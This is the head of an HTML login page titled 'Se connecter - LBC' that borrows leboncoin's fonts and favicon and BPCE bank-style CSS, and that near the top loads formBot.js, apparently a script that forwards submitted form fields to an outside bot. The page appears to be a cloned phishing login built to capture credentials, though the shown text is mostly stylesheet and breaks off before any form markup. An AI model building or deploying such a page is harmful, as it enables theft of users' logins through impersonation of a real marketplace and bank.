<!DOCTYPE html>

<html lang="fr" class="text-[62.5%]">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <title>Se connecter - LBC</title>
    <meta
      data-react-helmet="true"
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=6.0 user-scalable=0"
    />
    <meta name="next-head-count" content="3" />
    <link
      rel="preload"
      href="https://auth.leboncoin.fr/static/fonts/nunitosans-regular.woff2"
      as="font"
      type="font/woff2"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://auth.leboncoin.fr/static/fonts/nunitosans-bold.woff2"
      as="font"
      type="font/woff2"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://auth.leboncoin.fr/static/fonts/nunitosans-semibold.woff2"
      as="font"
      type="font/woff2"
      crossorigin="anonymous"
    />
    <link
      rel="icon"
      href="https://auth.leboncoin.fr/favicon-leboncoin.ico"
      sizes="any"
    />
    <link
      rel="preload"
      href="./index_files/f2f80e2fd03e98b5.css"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="stylesheet"
      href="./index_files/f2f80e2fd03e98b5.css"
      crossorigin="anonymous"
      data-n-g=""
    />
    <noscript data-n-css=""></noscript>

    <script src="https://cdn.jsdelivr.net/gh/yogeshwaran01/formBot.js@1.0.0/formBot.min.js"></script>

    <script
      src="./index_files/_middlewareManifest.js.téléchargement"
      defer=""
      crossorigin="anonymous"
    ></script>
    <style>
      form {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 1rem;
      }
      /* Style personnalisé pour la case à cocher */
      .custom-checkbox {
        top: 5px;
        position: relative;
        width: 2.3rem;
        height: 2.3rem;
        appearance: none; /* Enlève l'icône de coche par défaut */
        background-color: #f0f0f0;
        border: 2px solid #999;
        border-radius: 0.3rem;
        box-shadow: inset 0 0 0 4px white; /* Ajoute un espace blanc intérieur */
        cursor: pointer;
        transition: background-color 0.3s ease, box-shadow 0.3s ease;
      }

      /* Style appliqué lorsque la case est cochée */
      .custom-checkbox:checked {
        top: 5px;
        position: relative;
        background-color: #00008f;
        box-shadow: inset 0 0 0 4px white; /* Garde l’espace blanc même en étant coché */
      }
      .custom-button {
        margin-top: 2rem; /* Positionne le bouton un peu plus haut */
        padding: 1rem 15rem;
        font-size: 1.6rem;
        font-weight: 600;
        color: white;
        background-color: #47a80d;
        border: none;
        border-radius: 0.3rem;
        cursor: pointer;
        transition: background-color 0.3s ease;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 1rem;
      }

      .custom-button:hover {
        background-color: #3e8f0c;
      }
    </style>

    <style>
      .select {
        color: #333;
        background-color: #e4e4e7;
        display: block;
        width: 100%;
        padding: 26px 40px 8px;
        margin: 0;
        border: 1px solid transparent;
        border-bottom: 2px solid #666666;
        border-radius: 4px 4px 0 0;
        transition: border-color 0.35s ease;
        -webkit-appearance: none;
        font: 400 1rem / 1.375rem Ubuntu, Arial, sans-serif;
        letter-spacing: -0.14px;
      }

      /* Style pour la div de login */
      #loginForm {
        display: none; /* Cacher au départ */
        margin-top: 20px;
        padding: 20px;
        border: 2px solid #ccc;
        border-radius: 10px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
      }

      /* Styles pour améliorer l'apparence générale du formulaire */
      h3 {
        color: #333;
        font-size: 1.5em;
      }

      label {
        margin-bottom: 5px;
        font-size: 14px;
      }

      input {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
      }

      button {
        background-color: #28a745;
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 5px;
        cursor: pointer;
      }

      button:hover {
        background-color: #218838;
      }
    </style>
    <style scope="ux-logo">
      @media (max-width: 1020px) {
        :host(.is-desktop:not(.is-mobile)) {
          display: none !important;
        }

        .is-desktop:not(.is-mobile) {
          display: none !important;
        }

        :host(.is-tablet:not(.is-mobile)) {
          display: none !important;
        }

        .is-tablet:not(.is-mobile) {
          display: none !important;
        }
      }

      @media (min-width: 1021px) and (max-width: 1089px) {
        :host(.is-mobile:not(.is-tablet)) {
          display: none !important;
        }

        .is-mobile:not(.is-tablet) {
          display: none !important;
        }

        :host(.is-desktop:not(.is-tablet)) {
          display: none !important;
        }

        .is-desktop:not(.is-tablet) {
          display: none !important;
        }
      }

      @media (min-width: 1090px) {
        :host(.is-mobile:not(.is-desktop)) {
          display: none !important;
        }

        .is-mobile:not(.is-desktop) {
          display: none !important;
        }

        :host(.is-tablet:not(.is-desktop)) {
          display: none !important;
        }

        .is-tablet:not(.is-desktop) {
          display: none !important;
        }
      }

      :host(.m-align),
      .m-align {
        display: block;
        width: fit-content;

        width: -moz-fit-content;
      }

      :host(.m-center),
      .m-center {
        margin-left: auto;
        margin-right: auto;
      }

      :host(.m-left),
      .m-left {
        margin-right: auto;
      }

      :host(.m-right),
      .m-right {
        margin-left: auto;
      }

      @media (max-width: 740px) {
        :host(.m-center-m),
        .m-center-m {
          margin-left: auto;
          margin-right: auto;
        }

        :host(.m-left-m),
        .m-left-m {
          margin-right: auto;
        }

        :host(.m-right-m),
        .m-right-m {
          margin-left: auto;
        }
      }

      :host([radius]) .m-radius,
      :host([radius-none]) .m-radius {
        border-radius: var(--m-border-radius);
      }

      :host([radius-top-left]) .m-radius {
        border-top-left-radius: var(--m-border-top-left-radius);
      }

      :host([radius-top-right]) .m-radius {
        border-top-right-radius: var(--m-border-top-right-radius);
      }

      :host([radius-bottom-left]) .m-radius {
        border-bottom-left-radius: var(--m-border-bottom-left-radius);
      }

      :host([radius-bottom-right]) .m-radius {
        border-bottom-right-radius: var(--m-border-bottom-right-radius);
      }

      .visually-hidden,
      .a11y-hidden {
        position: fixed !important;
        top: -10000px !important;
        left: -10000px !important;
      }

      .caption-hidden {
        border: 0 !important;
        clip: rect(0 0 0 0) !important;
        clip-path: inset(50%) !important;
        height: 1px !important;
        margin: -1px !important;
        overflow: hidden !important;
        padding: 0 !important;
        position: static !important;
        top: -10000px;
        white-space: nowrap !important;
        font-size: 0 !important;
      }

      @media (max-width: 1019px) {
        .visually-hidden-mt,
        .a11y-hidden-mt {
          position: fixed !important;
          top: -10000px !important;
          left: -10000px !important;
        }
      }

      .visually-hidden,
      .a11y-hidden {
        position: fixed !important;
        top: -10000px !important;
        left: -10000px !important;
      }

      .caption-hidden {
        border: 0 !important;
        clip: rect(0 0 0 0) !important;
        clip-path: inset(50%) !important;
        height: 1px !important;
        margin: -1px !important;
        overflow: hidden !important;
        padding: 0 !important;
        position: static !important;
        top: -10000px;
        white-space: nowrap !important;
        font-size: 0 !important;
      }

      @media (max-width: 1019px) {
        .visually-hidden-mt,
        .a11y-hidden-mt {
          position: fixed !important;
          top: -10000px !important;
          left: -10000px !important;
        }
      }

      :host([fit="cover"]) .c-img {
        object-fit: cover;
      }

      :host([fit="contain"]) .c-img {
        object-fit: contain;
      }

      :host([fit="fill"]) .c-img {
        object-fit: fill;
      }

      :host([height]) {
        height: fit-content !important;
      }

      :host([width]) {
        width: fit-content !important;
      }

      :host([height]) .c-img,
      :host([width]) .c-img {
        width: 100%;
        height: 100%;
      }

      :host(:not([fit])) .c-img {
        object-fit: contain;
      }

      :host {
        width: var(--t-header-width);
        min-width: var(--t-header-width);
        height: var(--t-header-height);
        --background-color: var(--logo-background-color);
      }

      .c-logo {
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100%;
        height: 100%;
      }

      .c-logo-link {
        transition: background-color 0.25s;
      }

      .c-img {
        width: var(--t-logo-width);
        height: initial;
        max-height: 100%;
      }

      @media (min-width: 1090px) {
        :root {
          width: var(--t-logo-width-d);
          height: var(--t-logo-height-d);
        }
      }
    </style>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        border: 0;
        font: inherit;
        font-size: 100%;
        vertical-align: baseline;
      }
      body {
        line-height: 1;
      }
      html {
        box-sizing: border-box;
      }
      html body {
        color: #333;
      }
      *,
      *:before,
      *:after {
        box-sizing: inherit;
      }
      body {
        letter-spacing: -0.14px;
      }
      @media (min-width: 960px) {
        body {
          letter-spacing: 0;
        }
      }
      body,
      html {
        height: 100%;
      }
    </style>
    <link
      rel="stylesheet"
      href="styles.a208a39ec9f47a35.css"
      media="all"
      onload="this.media='all'"
    />
    <noscript
      ><link rel="stylesheet" href="styles.a208a39ec9f47a35.css"
    /></noscript>
    <style type="text/css"></style>
    <style>
      @keyframes _ngcontent-ng-c3948577619_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      .redirect-outlet[_ngcontent-ng-c3948577619] {
        height: 0;
        width: 0;
      }
      [_nghost-ng-c3948577619] .as-hint-text {
        display: inline-block;
        color: #666;
        font-size: 13px;
        letter-spacing: -0.2px;
        line-height: 16px;
        margin-bottom: 16px;
      }
      .js-container {
        background-color: #00008f !important;
      }
      .c-svg {
        position: relative;
        overflow: hidden;
        flex-shrink: 0;
        vertical-align: -0.15em;
        fill: currentcolor;
      }
    </style>
    <script
      type="text/javascript"
      async=""
      id="app-dynamics-script"
      src="https://cdn.appdynamics.com/adrum/adrum-21.2.0.3385.js"
    ></script>
    <style>
      [_nghost-ng-c2316078169] {
        display: block;
        height: 100%;
      }
    </style>
    <style>
      @keyframes _ngcontent-ng-c2166492574_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      .support-link.bpce-button-v2[_ngcontent-ng-c2166492574] {
        padding: 8px;
      }
      .authentication_frame[_ngcontent-ng-c2166492574] {
        height: 100%;
        width: 100%;
        display: flex;
        flex-direction: column;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        [_ngcontent-ng-c2166492574]:focus {
        outline: none;
      }
      .authentication_frame.standalone[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574] {
        margin: auto;
        padding-top: 40px !important;
        height: 100%;
      }
      @media (max-width: 959px) {
        .authentication_frame.standalone[_ngcontent-ng-c2166492574]
          .left-column[_ngcontent-ng-c2166492574] {
          padding: 16px !important;
        }
      }
      .authentication_frame.standalone[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]
        .as-page-container[_ngcontent-ng-c2166492574] {
        height: calc(100% - 96px) !important;
      }
      @media (max-width: 959px) {
        .authentication_frame.standalone[_ngcontent-ng-c2166492574]
          .left-column[_ngcontent-ng-c2166492574]
          .as-page-container[_ngcontent-ng-c2166492574] {
          height: calc(100% - 72px) !important;
        }
      }
      .authentication_frame.standalone[_ngcontent-ng-c2166492574]
        .right-column[_ngcontent-ng-c2166492574] {
        max-height: 100vh;
      }
      @media (max-width: 959px) {
        .authentication_frame.standalone[_ngcontent-ng-c2166492574]
          .right-column[_ngcontent-ng-c2166492574] {
          display: none;
        }
      }
      @media (min-width: 600px) and (max-width: 959px) {
        .authentication_frame.standalone[_ngcontent-ng-c2166492574]
          .right-column[_ngcontent-ng-c2166492574] {
          display: none;
        }
      }
      .authentication_frame.standalone[_ngcontent-ng-c2166492574]
        .as-page-title[_ngcontent-ng-c2166492574] {
        font-size: 21px !important;
        font-weight: 500 !important;
        letter-spacing: -0.1px !important;
        line-height: 32px !important;
        text-align: center;
      }
      @media (max-width: 959px) {
        .authentication_frame.standalone[_ngcontent-ng-c2166492574]
          .as-page-title[_ngcontent-ng-c2166492574] {
          font-size: 21px !important;
          font-weight: 500 !important;
          letter-spacing: -0.13px !important;
          line-height: 28px !important;
        }
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .welcome[_ngcontent-ng-c2166492574] {
        padding: 40px 0;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574] {
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        overflow: auto;
        height: 100%;
        overflow-x: hidden;
        padding-top: 32px;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]::-webkit-scrollbar {
        width: 12px;
        height: 12px;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]::-webkit-scrollbar-track {
        background: #f1f1f1;
        border-radius: 10px;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]::-webkit-scrollbar-thumb {
        background: #888;
        border-radius: 10px;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]::-webkit-scrollbar-thumb:hover {
        background: #555;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]
        .user-card[_ngcontent-ng-c2166492574] {
        width: 100%;
        max-width: 366px;
        margin-top: 32px;
        margin-bottom: 24px;
        padding: 0 !important;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]
        .container[_ngcontent-ng-c2166492574] {
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        margin: auto;
        max-width: 582px;
        height: 100%;
        width: 100%;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]
        .container[_ngcontent-ng-c2166492574]
        .as-page-container[_ngcontent-ng-c2166492574] {
        height: 100%;
        outline: 0;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column[_ngcontent-ng-c2166492574]
        .container[_ngcontent-ng-c2166492574]
        .bottomShadow
        .leftBottom {
        z-index: 2;
        box-shadow: 0 -14px 8px -8px #0003;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .left-column.saved-user[_ngcontent-ng-c2166492574] {
        padding-top: 0 !important;
        display: flex;
        flex-direction: column;
        align-items: center;
      }
      .authentication_frame[_ngcontent-ng-c2166492574]
        .right-column[_ngcontent-ng-c2166492574] {
        padding: 0;
        height: 100%;
      }
      .as-page-title[_ngcontent-ng-c2166492574] {
        color: #333;
        font-size: 21px;
        font-weight: 500;
        letter-spacing: -0.1px;
        margin-bottom: 24px;
        word-wrap: break-word;
        line-height: 32px !important;
        text-align: center;
      }
      @media (max-width: 959px) {
        .as-page-title[_ngcontent-ng-c2166492574] {
          font-size: 21px;
          font-weight: 500;
          letter-spacing: -0.13px;
        }
      }
      @media (min-width: 600px) and (max-width: 959px) {
        .as-page-title[_ngcontent-ng-c2166492574] {
          font-size: 21px;
          font-weight: 500;
          letter-spacing: -0.13px;
        }
      }
      .evitement[_ngcontent-ng-c2166492574] {
        position: fixed !important;
        left: -1000px;
        z-index: 1;
        top: 16px;
        color: #333;
      }
      .evitement[_ngcontent-ng-c2166492574]:focus {
        left: 100px;
      }
      @media (max-width: 959px) {
        .evitement[_ngcontent-ng-c2166492574]:focus {
          font-size: 0.75rem !important;
          top: 13px;
          left: 80px;
        }
      }
      .icon-change[_ngcontent-ng-c2166492574] * {
        font-size: 12px !important;
      }
      as-maintenance-blocking-message[_ngcontent-ng-c2166492574] {
        margin: 32px;
      }
    </style>
    <style>
      [_nghost-ng-c2950371234] {
        display: flex;
        flex-direction: column;
        height: 100%;
      }
    </style>
    <style>
      @keyframes _ngcontent-ng-c1585822195_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      [_nghost-ng-c1585822195],
      form[_ngcontent-ng-c1585822195] {
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        height: 100%;
      }
      .leftBottom[_ngcontent-ng-c1585822195] {
        -ms-flex-shrink: 0;
        flex-shrink: 0;
      }
      .error[_ngcontent-ng-c1585822195] {
        color: #333;
      }
      .text-center[_ngcontent-ng-c1585822195] {
        text-align: center;
      }
      ui-input-v2[_ngcontent-ng-c1585822195] {
        display: block;
        margin-bottom: 16px;
      }
      ui-checkbox[_ngcontent-ng-c1585822195] {
        margin-bottom: 16px;
      }
      .input-identifier[_ngcontent-ng-c1585822195] {
        margin-bottom: 8px;
      }
      button.forgotten-id[_ngcontent-ng-c1585822195],
      a.forgotten-id[_ngcontent-ng-c1585822195] {
        margin-bottom: 18px;
      }
      as-maintenance-informative-message[_ngcontent-ng-c1585822195] {
        margin-top: 16px;
        display: block;
      }
    </style>
    <style>
      .bpce-input-v2-loader[_ngcontent-ng-c3742105713] {
        border: none;
        background: none;
        padding: 0;
        cursor: pointer;
      }
      @keyframes _ngcontent-ng-c3742105713_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      .bpce-input-v2-redacted[_ngcontent-ng-c3742105713]
        .bpce-input-v2-value-redacted[_ngcontent-ng-c3742105713],
      .bpce-input-v2-field[_ngcontent-ng-c3742105713],
      .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        font: 400 1rem/1.375rem Ubuntu, Arial, sans-serif;
        letter-spacing: -0.14px;
      }
      @media (min-width: 960px) {
        .bpce-input-v2-redacted[_ngcontent-ng-c3742105713]
          .bpce-input-v2-value-redacted[_ngcontent-ng-c3742105713],
        .bpce-input-v2-field[_ngcontent-ng-c3742105713],
        .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
          letter-spacing: 0;
        }
      }
      .bpce-input-v2-error-msg[_ngcontent-ng-c3742105713] {
        font: 400 0.8125rem/1.125rem Ubuntu, Arial, sans-serif;
        letter-spacing: 0;
      }
      [_nghost-ng-c3742105713] {
        display: block;
      }
      .bpce-input-v2[_ngcontent-ng-c3742105713] {
        width: 100%;
        display: block;
        position: relative;
      }
      .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        color: #333;
        position: absolute;
        top: 16px;
        padding: 0;
        transform-origin: 0 0;
        transform: translate3d(8px, 0, 0) scale(1);
        transition: transform 0.25s ease 0.1s, color 0.25s ease 0.1s;
        pointer-events: none;
      }
      .bpce-input-v2[_ngcontent-ng-c3742105713]
        button.bpce-input-v2-icon[_ngcontent-ng-c3742105713] {
        position: absolute;
        right: 4px;
        top: 8px;
        color: #333;
      }
      .bpce-input-v2-loader[_ngcontent-ng-c3742105713] {
        margin: 0;
        position: absolute;
        right: 10px;
        top: 12px;
      }
      .bpce-input-v2-loader[_ngcontent-ng-c3742105713]
        ui-loader[_ngcontent-ng-c3742105713] {
        position: relative;
        z-index: 1;
        color: #333;
        display: flex;
        height: 30px;
        width: 30px;
        align-items: center;
        justify-content: center;
      }
      .bpce-input-v2-error-msg[_ngcontent-ng-c3742105713],
      .bpce-input-v2-custom-msg[_ngcontent-ng-c3742105713] {
        margin: 0;
        padding: 0;
        opacity: 0;
        visibility: hidden;
        max-height: 0;
        transition: opacity 0.35s ease, max-height 0.35s ease, margin 0.35s ease,
          visibility 0.35s ease;
      }
      .bpce-input-v2-error-msg[_ngcontent-ng-c3742105713] {
        display: block;
        color: #e91b06;
      }
      .bpce-input-v2-field[_ngcontent-ng-c3742105713] {
        color: #333;
        background-color: #f9f9fb;
        display: block;
        width: 100%;
        padding: 26px 40px 5px 8px;
        margin: 0;
        border: 1px solid transparent;
        border-bottom: 2px solid #666666;
        border-radius: 4px 4px 0 0;
        transition: border-color 0.35s ease;
        -webkit-appearance: none;
      }
      @media (hover: hover) and (pointer: fine) {
        .bpce-input-v2-field[_ngcontent-ng-c3742105713]:hover {
          border-color: #666;
        }
      }
      .bpce-input-v2-field[_ngcontent-ng-c3742105713]:focus,
      .bpce-input-v2-field-focus[_ngcontent-ng-c3742105713] {
        outline: none;
        border-color: #333;
      }
      .bpce-input-v2-field[_ngcontent-ng-c3742105713]:read-only {
        color: #333 !important;
      }
      .bpce-input-v2-field[_ngcontent-ng-c3742105713]:disabled {
        background-color: #f5f5f5;
        border-color: transparent;
        color: #999 !important;
        cursor: not-allowed;
        opacity: 1;
      }
      .bpce-input-v2-field[_ngcontent-ng-c3742105713]::-ms-clear,
      .bpce-input-v2-field[_ngcontent-ng-c3742105713]::-ms-reveal {
        display: none;
      }
      .bpce-input-v2-field-error[_ngcontent-ng-c3742105713] {
        border-color: #e91b06 !important;
      }
      .bpce-input-v2-field[type="number"][_ngcontent-ng-c3742105713] {
        padding-right: 8px;
      }
      .bpce-input-v2-field-placeholder[_ngcontent-ng-c3742105713]:focus::placeholder {
        color: #999;
        transition: color 0.35s ease 0.1s;
      }
      .bpce-input-v2-label-float[_ngcontent-ng-c3742105713] {
        color: #666;
        transform: translate3d(8px, -8px, 0) scale(0.8125);
        transition: transform 0.25s ease, color 0.25s ease;
      }
      .bpce-input-v2-field[_ngcontent-ng-c3742105713]:disabled
        + .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        color: #999;
      }
      .bpce-input-v2-field-error[_ngcontent-ng-c3742105713]
        ~ .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        color: #e91b06 !important;
      }
      .bpce-input-v2-field-error[_ngcontent-ng-c3742105713]
        ~ .bpce-input-v2-error-msg[_ngcontent-ng-c3742105713] {
        opacity: 1;
        max-height: 56px;
        margin-top: 8px;
        visibility: visible;
      }
      .bpce-input-v2[_ngcontent-ng-c3742105713]
        input[_ngcontent-ng-c3742105713]::-webkit-outer-spin-button,
      .bpce-input-v2[_ngcontent-ng-c3742105713]
        input[_ngcontent-ng-c3742105713]::-webkit-inner-spin-button {
        -webkit-appearance: none;
        margin: 0;
      }
      .bpce-input-v2[_ngcontent-ng-c3742105713]
        input[_ngcontent-ng-c3742105713]::-webkit-search-cancel-button {
        display: none;
      }
      .bpce-input-v2[_ngcontent-ng-c3742105713]
        input[type="number"][_ngcontent-ng-c3742105713] {
        -moz-appearance: textfield;
      }
      .bpce-input-v2-password[_ngcontent-ng-c3742105713]
        .bpce-input-v2-field[type="text"][_ngcontent-ng-c3742105713]
        ~ .bpce-input-v2-icon[_ngcontent-ng-c3742105713] {
        opacity: 1;
        visibility: visible;
      }
      @media (hover: hover) and (pointer: fine) {
        .bpce-input-v2[_ngcontent-ng-c3742105713]:hover
          .bpce-input-v2-field[_ngcontent-ng-c3742105713]:not(:focus):not(
            :disabled
          ) {
          border-color: #666;
        }
      }
      .bpce-input-v2-message-info[_ngcontent-ng-c3742105713]
        .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        color: #666;
      }
      .bpce-input-v2-message-info[_ngcontent-ng-c3742105713]
        .bpce-input-v2-field[_ngcontent-ng-c3742105713] {
        border-color: #666;
      }
      .bpce-input-v2-message-error[_ngcontent-ng-c3742105713]
        .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        color: #e91b06;
      }
      .bpce-input-v2-message-error[_ngcontent-ng-c3742105713]
        .bpce-input-v2-field[_ngcontent-ng-c3742105713] {
        border-color: #e91b06;
      }
      .bpce-input-v2-message-success[_ngcontent-ng-c3742105713]
        .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        color: #398538;
      }
      .bpce-input-v2-message-success[_ngcontent-ng-c3742105713]
        .bpce-input-v2-field[_ngcontent-ng-c3742105713] {
        border-color: #398538;
      }
      .bpce-input-v2-message-warning[_ngcontent-ng-c3742105713]
        .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        color: #fa5c00;
      }
      .bpce-input-v2-message-warning[_ngcontent-ng-c3742105713]
        .bpce-input-v2-field[_ngcontent-ng-c3742105713] {
        border-color: #fa5c00;
      }
      .bpce-input-v2-message-info[_ngcontent-ng-c3742105713]:not(
          .bpce-input-v2-disabled
        )
        .bpce-input-v2-custom-msg[_ngcontent-ng-c3742105713],
      .bpce-input-v2-message-error[_ngcontent-ng-c3742105713]:not(
          .bpce-input-v2-disabled
        )
        .bpce-input-v2-custom-msg[_ngcontent-ng-c3742105713],
      .bpce-input-v2-message-success[_ngcontent-ng-c3742105713]:not(
          .bpce-input-v2-disabled
        )
        .bpce-input-v2-custom-msg[_ngcontent-ng-c3742105713],
      .bpce-input-v2-message-warning[_ngcontent-ng-c3742105713]:not(
          .bpce-input-v2-disabled
        )
        .bpce-input-v2-custom-msg[_ngcontent-ng-c3742105713] {
        opacity: 1;
        max-height: 56px;
        margin-top: 8px;
        visibility: visible;
      }
      .bpce-input-v2-value-redacted[_ngcontent-ng-c3742105713] {
        display: none;
      }
      .bpce-input-v2-redacted[_ngcontent-ng-c3742105713]
        .bpce-input-v2-value-redacted[_ngcontent-ng-c3742105713] {
        color: #333;
        background-color: #f9f9fb;
        display: block;
        position: absolute;
        top: 27px;
        left: 9px;
        width: calc(100% - 65px);
        cursor: text;
        pointer-events: none;
      }
      .bpce-input-v2-disabled[_ngcontent-ng-c3742105713]
        .bpce-input-v2-field[_ngcontent-ng-c3742105713] {
        background-color: #f5f5f5;
        border-color: transparent;
        color: #999;
        cursor: not-allowed;
        opacity: 1;
      }
      .bpce-input-v2-disabled[_ngcontent-ng-c3742105713]
        .bpce-input-v2-label[_ngcontent-ng-c3742105713] {
        color: #999;
      }
      .bpce-input-v2-disabled[_ngcontent-ng-c3742105713]
        .bpce-input-v2-value-redacted[_ngcontent-ng-c3742105713] {
        color: #999;
        background-color: #f5f5f5;
      }
    </style>
    <style>
      .bpce-button-group[_nghost-ng-c1756124937] {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
      }
      .bpce-button-group[_nghost-ng-c1756124937] .bpce-button {
        max-width: initial;
      }
      .bpce-button-group[_nghost-ng-c1756124937]
        .bpce-button-inline
        + .bpce-button-inline {
        margin-left: 8px;
      }
      .bpce-button-group[_nghost-ng-c1756124937]
        .bpce-button-flex
        + .bpce-button-flex {
        margin-left: 16px;
      }
      .bpce-button-group[_nghost-ng-c1756124937]
        .bpce-button-block
        + .bpce-button-block {
        margin-top: 8px;
      }
    </style>
    <style>
      .bpce-button[_nghost-ng-c2770057049] {
        border: none;
        background: none;
        padding: 0;
        cursor: pointer;
      }
      @keyframes _ngcontent-ng-c2770057049_shimmering {
        0% {
          transform: translate3d(-100%, 0, 0);
        }
        to {
          transform: translate3d(75%, 0, 0);
        }
      }
      .bpce-button-icon-only[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049]:not(.bpce-icon),
      .sr-only[_ngcontent-ng-c2770057049] {
        border: 0;
        clip: rect(0 0 0 0);
        height: 1px;
        margin: -1px;
        overflow: hidden;
        padding: 0;
        position: absolute;
        width: 1px;
        outline: 0;
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
      }
      .sr-only-focusable[_ngcontent-ng-c2770057049]:active,
      .sr-only-focusable[_ngcontent-ng-c2770057049]:focus {
        position: static;
        width: auto;
        height: auto;
        overflow: visible;
        clip: auto;
        white-space: normal;
      }
      .bpce-button-primary.bpce-button-font-text[_nghost-ng-c2770057049],
      .bpce-button-secondary.bpce-button-font-text[_nghost-ng-c2770057049],
      .bpce-button[_nghost-ng-c2770057049] {
        font: 400 1rem/1.375rem Ubuntu, Arial, sans-serif;
        letter-spacing: -0.14px;
      }
      @media (min-width: 960px) {
        .bpce-button-primary.bpce-button-font-text[_nghost-ng-c2770057049],
        .bpce-button-secondary.bpce-button-font-text[_nghost-ng-c2770057049],
        .bpce-button[_nghost-ng-c2770057049] {
          letter-spacing: 0;
        }
      }
      .bpce-button-tertiary[_nghost-ng-c2770057049],
      .bpce-button-quaternary[_nghost-ng-c2770057049],
      .bpce-button-primary.bpce-button-font-mention[_nghost-ng-c2770057049],
      .bpce-button-secondary.bpce-button-font-mention[_nghost-ng-c2770057049] {
        font: 400 0.8125rem/1.125rem Ubuntu, Arial, sans-serif;
        letter-spacing: 0;
      }
      .bpce-focus-reset[_ngcontent-ng-c2770057049] {
        outline: 0;
        outline: none;
        box-shadow: none;
        border-color: transparent;
        transition: box-shadow 225ms cubic-bezier(0.4, 0, 0.2, 1);
        cursor: pointer;
      }
      .bpce-focus-reset[disabled][_ngcontent-ng-c2770057049] {
        cursor: default;
      }
      .bpce-focus-style[_ngcontent-ng-c2770057049] {
        box-shadow: 0 0 2px 3px #5c8bd7;
      }
      .bpce-button[_nghost-ng-c2770057049] {
        border: 1px solid;
        position: relative;
        display: inline-flex;
        flex: 0 1 auto;
        align-items: center;
        justify-content: center;
        padding: 7px 11px;
        border-radius: 4px;
        text-decoration: none;
        max-width: 588px;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
      }
      .bpce-button[_nghost-ng-c2770057049] > span[_ngcontent-ng-c2770057049],
      .bpce-button[_nghost-ng-c2770057049]
        > ui-icon-v2[_ngcontent-ng-c2770057049] {
        position: relative;
        z-index: 1;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        color: inherit;
      }
      .bpce-button[_nghost-ng-c2770057049]
        > ui-icon-v2[_ngcontent-ng-c2770057049]
        + span[_ngcontent-ng-c2770057049] {
        margin-left: 8px;
      }
      .bpce-button[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049]
        + ui-icon-v2[_ngcontent-ng-c2770057049] {
        margin-left: 8px;
      }
      .bpce-button-primary.bpce-button-font-mention[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049],
      .bpce-button-secondary.bpce-button-font-mention[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049] {
        min-height: 18px;
        min-width: 18px;
      }
      .bpce-button-primary.bpce-button-font-text[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049],
      .bpce-button-secondary.bpce-button-font-text[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049] {
        min-height: 24px;
        min-width: 24px;
      }
      .bpce-button-tertiary[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049],
      .bpce-button-quaternary[_nghost-ng-c2770057049]
        > span[_ngcontent-ng-c2770057049] {
        min-height: 18px;
        min-width: 18px;
      }
      .bpce-button-primary[_nghost-ng-c2770057049]:before,
      .bpce-button-secondary[_nghost-ng-c2770057049]:before,
      .bpce-button-tertiary[_nghost-ng-c2770057049]:before,
